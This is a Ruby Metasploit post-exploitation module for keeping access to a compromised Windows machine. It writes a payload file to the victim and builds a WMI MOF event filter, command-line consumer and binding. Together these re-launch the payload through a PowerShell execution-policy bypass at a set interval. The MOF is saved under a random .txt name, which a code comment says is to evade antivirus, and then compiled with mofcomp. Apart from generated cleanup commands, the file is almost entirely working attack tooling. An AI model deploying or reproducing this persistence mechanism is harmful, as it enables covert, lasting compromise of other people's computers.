require 'zlib'

require 'msf/core/payload_generator'
require 'msf/core/exploit/powershell'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/exploit/exe'

class MetasploitModule < Msf::Post
  #include Msf::Post::File
  #include Msf::Exploit::Powershell
  #include Exploit::EXE
  #include Msf::Post::Common

  def initialize(info={})
    super(update_info(info,
      'Name'                 => "Windows Managed Object Files Persistence via Powershell",
      'Description'          => %q{This module will attempt to use MOF to establish persistence on a machine as an alternative to the persistence meterpreter script. This will require at least local administrative rights and powershell present on the machine.},
      'License'              => MSF_LICENSE,
      'Platform'             => ['win'],
      'SessionTypes'         => ['meterpreter'],
      'DefaultOptions'  =>
        {
          'EXITFUNC'         => "none"
        },
      'Targets'        =>
        [
          [ 'Windows x86', { 'Arch' => ARCH_X86 } ],
          [ 'Windows x64', { 'Arch' => ARCH_X64 } ]
        ],
      'Author'               => [
        'Created by khr0x40sh',
        'Upgraded by F0rb1dd3n'
        ],
      'DefaultTarget'  => 0))

    register_options(
      [
        OptInt.new( 'INTERVAL', [true, 'Interval beween callbacks', 60]),
        OptString.new('CLASSNAME', [false, 'MOF Event and CommandLine Consumer Class Name (default: random)']),
        OptString.new('RNAME', [false, 'Name of the file that will be called by mof event (default: random)']),
        OptString.new('FILE', [true, 'Path of the file with the payload that will be called by mof event']),
        OptString.new('FILETYPE', [false, 'Extention of the file that will be called by mof event (default: exe)', 'exe']),
      ])

    register_advanced_options(
      [
        OptString.new('W_PATH',  [false, 'PATH to write temporary MOF', '%TEMP%' ]),
        OptBool.new(  'DELETE',  [false, 'Delete MOF after execution', true ]),
        OptBool.new(  'DRY_RUN', [false, 'Only show what would be done', false ]),
        OptInt.new('TIMEOUT',    [false, 'Execution timeout', 15]),
      ])

  end

  def run

    return 0 if ! (session.type == "meterpreter")

    path=""
    if datastore['W_PATH'].include? "%"
        path1 = datastore['W_PATH']
        path2 = path1.split("\\")

        path2.each do |i|
                if i.include? "%"
                        i.gsub!("%","")
                        i =session.sys.config.getenv(path1)
                end
                path.concat("#{i}\\")
        end
    else
        path = datastore['W_PATH']
    end

    @arch = session.sys.config.getenv('ARCH')

    rexename = datastore['RNAME'] || Rex::Text.rand_text_alpha((rand(8)+6))

    mof_class_name = datastore['CLASSNAME'] || Rex::Text.rand_text_alpha((rand(8)+6))
    datastore['DisablePayloadHandler'] = true

    #payl = generate_payload_exe
    payl = File.read(datastore['FILE'])

    if datastore['FILETYPE'] == 'bat'
      bin_file_name = path + "\\" + rexename + ".bat"
    else
      if
      bin_file_name = path + "\\" + rexename + ".exe"
      else
        bin_file_name = path + "\\" + rexename + "." + datastore['FILE']
      end
    end

    print_status("Running MOF persistence script...\n")
    print_status("Using interval #{datastore['INTERVAL']} seconds")

    mof_header="#pragma namespace(\"\\\\.\\root\\subscription\")\n"
    mof_filter ="instance of __EventFilter as $FILTER\n"
    mof_filter +="{\n"
    mof_filter +="   Name = \"#{mof_class_name}\";\n"
    mof_filter +="   EventNamespace = \"root\\cimv2\";\n"
    mof_filter +="   Query = \"SELECT * FROM __InstanceModificationEvent \"\n"
    mof_filter +="   \"WITHIN #{datastore['INTERVAL']} WHERE TargetInstance ISA 'Win32_PerfFormattedDATA_PerfOS_System' AND \"\n"
    mof_filter +="   \"TargetInstance.SystemUpTime >=360\";\n"
    mof_filter +="   QueryLanguage = \"WQL\";\n"
    mof_filter +="};\n"

    mof_consumer = "instance of CommandLineEventConsumer as $CONSUMER\n"
    mof_consumer +="{\n"
    mof_consumer +="   Name = \"#{mof_class_name}\";\n"
    mof_consumer +="   RunInteractively = false;\n"
    mof_consumer +="   CommandLineTemplate = \"powershell.exe -exec Bypass -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=[string]::Concat(' ''',$env:windir, '\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe''')};$t=New-Object System.Diagnostics.ProcessStartInfo;$t.FileName=$b;$t.Arguments=''-exec Bypass -c #{bin_file_name}'';$t.UseShellExecute=$false;$p=[System.Diagnostics.Process]::Start($t);\";\n"
    mof_consumer +="};\n"

    mof_binding = "instance of __FilterToConsumerBinding\n"
    mof_binding +="{\n"
    mof_binding +="	Consumer = $CONSUMER;\n"
    mof_binding +="	Filter = $FILTER;\n"
    mof_binding +="};\n"


    mof = mof_header + mof_filter + mof_consumer + mof_binding

    mof.gsub!('\\', '\\\\\\')
    mof.gsub!("''","\\\\\\\\\\\\\"")

    if datastore['DRY_RUN']
       print_good("MOF\n #{mof}")
       return
    end

    fd_bin = session.fs.file.new(bin_file_name, "wb")
    print_status("Writing payload file #{bin_file_name}")
    fd_bin.write(payl)
    fd_bin.close

    file  = Rex::Text.rand_text_alpha((rand(8)+6)) + ".txt" # evades AV looking for .mof
    file = path +""+ file
    fd = session.fs.file.new(file, "wb")
    print_status("Writing mof #{file}")
    fd.write(mof)
    fd.close

    cmd_out, running_pids, open_channels = cmd_exec("mofcomp "+file)
    print_status("Compiling...\n\n" + cmd_out + "\n")

    if datastore['DELETE']
        file.gsub!('\\', '\\\\\\')
        print_status("Cleaning up remnant MOF #{file}")
        rm_f(file)
    end

    # Clean up script
    @clean_up_rc = log_file()
       print_status("Writing cleanup script...")
       file_local_write(@clean_up_rc, "execute -f powershell.exe -a \"-exec Bypass gwmi -namespace root\\\\subscription -query \\\\\\\"SELECT * FROM __EventFilter WHERE Name='#{mof_class_name}'\\\\\\\" | rwmi \"")
       file_local_write(@clean_up_rc, "execute -f powershell.exe -a \"-exec Bypass gwmi -namespace root\\\\subscription -query \\\\\\\"SELECT * FROM CommandLineEventConsumer WHERE Name='#{mof_class_name}'\\\\\\\" | rwmi \"")
       file_local_write(@clean_up_rc, "execute -f powershell.exe -a \"-exec Bypass gwmi -namespace root\\\\subscription -query \\\\\\\"SELECT * FROM __FilterToConsumerBinding WHERE __PATH LIKE '%Name=__#{mof_class_name}%'\\\\\\\" | rwmi \"")

     print_status("Quick removal command line: C:\\> powershell.exe -exec Bypass gwmi -namespace root\\subscription -query \"SELECT * FROM CommandLineEventConsumer WHERE Name='#{mof_class_name}'\"")
     print_status("This will only stop the MOF persistence and clean the CommandLineEventConsumer.  For a full clean, use #{@clean_up_rc}.")

    print_good('Done!')
  end

def log_file(log_path = nil)
  @client = client

  host = @client.sys.config.sysinfo["Computer"]

  filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")

  if log_path
    logs = ::File.join(log_path, 'logs', 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
  else
    logs = ::File.join(Msf::Config.log_directory, 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
  end


  ::FileUtils.mkdir_p(logs)


  logfile = logs + ::File::Separator + Rex::FileUtils.clean_path(host + filenameinfo) + ".rc"
  return logfile
end

end
